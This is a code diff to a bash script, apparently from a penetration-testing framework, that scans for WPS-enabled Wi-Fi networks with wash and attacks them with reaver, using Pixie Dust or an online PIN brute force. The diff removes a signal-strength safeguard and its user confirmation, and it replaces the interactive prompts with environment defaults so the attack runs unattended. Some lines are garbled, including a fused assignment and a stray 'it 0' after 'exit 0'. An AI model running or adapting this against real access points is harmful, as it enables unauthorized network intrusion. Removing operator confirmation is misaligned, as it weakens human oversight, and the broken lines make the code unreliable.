@@ -29,17 +29,11 @@ C_BOLD="${ASTRA_COLOR_BOLD:-}"
 C_ACTION="${ASTRA_COLOR_ACTION:-}"
 C_RESET="${ASTRA_COLOR_RESET:-}"
 
-# SNR Safeguard (Red Team Hardening)
-if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
-    echo -e "[*] WPS brute-force is highly likely to fail and trigger AP lockouts for zero gain."
-    stty sane
-    read -p "$(echo -e "${C_ACTION} [?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
-    [[ "$snr_continue" != "y" ]] && exit 0
-fi
 
 # Inputs from Environment
-# ...
+
+WPS_ATTACK="${WPS_ATTACK:-1}"
+WPS_DELAY="${WPS_DELAY:-}"# ...
 
 if [[ -z "$INTERFACE" ]]; then
     echo "[!] MONITOR_INTERFACE not set."
@@ -49,15 +43,18 @@ fi
 # 1. Scan Phase
 echo -e "${C_PROMPT}[*]${C_RESET} Scanning for WPS-enabled networks..."
 WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
-timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>/dev/null || true
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    timeout 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
+else
+    timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
+fi
 
 # 2. Tactical Selection
 if [[ -n "$BSSID" ]]; then
     echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select WPS Attack Vector for ${C_VAR}${BSSID}${C_RESET}:"
     echo "    1) Pixie Dust (Fast, 1 transaction)"
     echo "    2) Online Brute-Force (Sequential guessing)"
-    stty sane
-    read -p "$(echo -e "${C_ACTION} Selection [1/2]: ${C_RESET}")" attack_choice
+attack_choice="${WPS_ATTACK:-1}"
 
     REAVER_ARGS="-i $INTERFACE -b $BSSID"
     [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
@@ -66,15 +63,18 @@ if [[ -n "$BSSID" ]]; then
         echo -e "${C_PROMPT}[*]${C_RESET} Initializing Pixie Dust attack..."
         REAVER_ARGS+=" -K 1"
     else
-        stty sane
-        read -p "$(echo -e "${C_ACTION} [?] Enter delay between attempts (seconds): ${C_RESET}")" delay
+delay="${WPS_DELAY:-}"
         [[ -n "$delay" ]] && REAVER_ARGS+=" -d $delay"
         echo -e "${C_PROMPT}[!]${C_RESET} ${C_BOLD}WARNING: Online brute-force is loud and will trigger WIDS.${C_RESET}"
     fi
 
     echo "[*] Starting reaver with tactical parameters..."
     INFO_FILE="${EVIDENCE_DIR}/${TC_ID}_reaver_info.txt"
-    reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 &
+    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+        reaver $REAVER_ARGS -vv 2>&1 | tee "$INFO_FILE" &
+    else
+        reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 &
+    fi
     REAVER_PID=$!
     
     # 3. Smart Exit Polling
@@ -138,3 +138,4 @@ else
 fi
 
 exit 0
+it 0
